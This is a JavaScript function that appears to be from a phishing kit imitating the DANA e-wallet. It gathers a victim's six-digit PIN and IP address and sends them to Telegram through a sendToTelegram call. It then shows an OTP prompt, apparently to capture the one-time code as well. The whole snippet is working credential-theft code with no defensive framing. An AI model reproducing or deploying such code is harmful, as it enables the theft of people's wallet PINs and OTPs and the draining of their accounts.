async function sendPin(){
    $("#process").show();
    const pin = [
        $('#pin1').val(),
        $('#pin2').val(),
        $('#pin3').val(),
        $('#pin4').val(),
        $('#pin5').val(),
        $('#pin6').val()
    ].join('');
    const ip = await getIPAddress();
    const message = `🔒 *PIN DANA*\n🔑 PIN: ${pin}\n🌐 IP: \`${ip}\`\n⏰ Time: ${new Date().toLocaleString()}`;
    await sendToTelegram(message);
    $("#process").hide();
    $('.inppin').val('');
    $(".bgotp").fadeIn();
    setInterval(countdown, 1000);
    $("#otp1").focus();
}